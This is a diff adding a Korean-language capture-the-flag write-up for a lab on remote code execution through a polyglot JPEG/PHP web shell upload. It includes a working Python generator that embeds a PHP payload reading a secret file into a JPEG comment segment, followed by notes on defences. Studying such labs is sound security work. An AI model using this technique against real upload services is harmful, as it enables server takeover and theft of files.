@@ -1,0 +1,67 @@
+#🚩Lab: Remote code execution via polyglot web shell upload
+
+This lab contains a vulnerable image upload function. 
+Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.
+To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. 
+Submit this secret using the button provided in the lab banner.
+You can log in to your own account using the following credentials: wiener:peter
+
+### 🔍 분석 및 공격 과정
+1. 파일의 내용물을 확인 해보는 필터링을 우회하는 것.
+2. 로그인 후 웹셸을 업로드해봄. 역시나 차단. jpeg나 jpg만 된다고 함.
+3. 내용물을 jpeg 파일 처럼 만들고 그 내부에 php 웹셸을 끼워넣는다면? -> 바로 이게 polyglot 파일.
+4. 일단 매우 간단한 polyglot한 웹셸을 만드는 코드를 파이썬으로 제작.
+>>>
+  data = (
+      b'\xff\xd8\xff\xdb\x00\x43\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07'
+      b'\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d'
+      b'\x1a\x1f\x1e\x1d\x1a\x1c\x1c\x20\x24\x2e\x27\x20\x22\x2c\x23\x1c'
+      b'\x1c\x28\x37\x29\x2c\x30\x31\x34\x34\x34\x1f\x27\x39\x3d\x38\x32'
+      b'\x3c\x2e\x33\x34\x32\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01'
+      b'\x11\x00\xff\xc4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00'
+      b'\x00\x00\x00\x00\x00\x00\x00\x09\xff\xda\x00\x08\x01\x01\x00\x00'
+      b'\x3f\x00\x37\xff\xd9'
+  )
+  
+  import sys
+  
+  # 사용법: python3 polyglot.py <원본이미지.jpg> <출력파일.php>
+  if len(sys.argv) < 2:
+      print("Usage: python spolyglot.py <output.php>")
+      sys.exit(1)
+  
+  output_file = sys.argv[1]
+  
+  
+  # 실행할 PHP 웹셸 코드
+  php_payload = b"<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>"
+  
+  # JPEG Comment (COM) 세그먼트 생성 규칙:
+  # \xFF\xFE (COM 마커 2바이트) + [데이터길이 2바이트] + [주석으로 실릴 진짜 데이터 가변길이]
+  # 데이터길이 =  (PHP코드 길이 + 길이 변수 자체의 2바이트). 즉 마커길이는 제외한 바이트수
+  payload_len = len(php_payload) + 2
+  len_bytes = payload_len.to_bytes(2, byteorder='big')
+  com_segment = b'\xFF\xFE' + len_bytes + php_payload
+  
+  
+  
+  # JPEG 시작 마커(\xFF\xD8) 바로 뒤에 COM 세그먼트를 끼워넣습니다.
+  if data.startswith(b'\xFF\xD8'): #<- JPEG의 특징인 매직바이트임
+      if (k := data.find(b'\xFF\xFE'))> -1:
+          old_len = int.from_bytes(data[k+2:k+4], byteorder='big')
+          next_pos = k + 2 + old_len
+          new_data = data[:k] + com_segment + data[next_pos:]
+      else:
+          new_data = data[:2] + com_segment + data[2:]
+      with open(output_file, 'wb') as f:
+          f.write(new_data)
+      print(f"[+] 성공! {output_file} 파일이 생성되었습니다.")
+  else:
+      print("[-] 오류: 올바른 JPEG 이미지가 아닙니다.")
+5. 해당 코드로 만든 폴리글랏한 파일을 제출하여 START 와 END 사이에 찍힌 플래그를 가져와버리면 solve
+
+### 💡 취약점 원리
+ JPEG, JPG 파일의 구조와 콘텐츠 검증 로직을 제대로 갖추긴 했으나 파일 내부의 메타 데이터는 엄격하게 필터링
+하지 않았고 화이트리스트를 통한 확장자 필터링도 구현되어 있지 않아 발생한 문제였음. 이런 폴리글랏한 파일을 막기 위해서는
+이미지를 한번 리사이징하거나 이미지 파일로 재인코딩하는 작업을 통해 내부의 악성코드를 깨지게 만들 수 있음. 그러나 사실 방어책으로
+재인코딩을 수행하더라도 깨지지 않는 우회 폴리글랏도 존재하기에 근본적인 해결책은 실행 권한을 분리하는데에 있다.
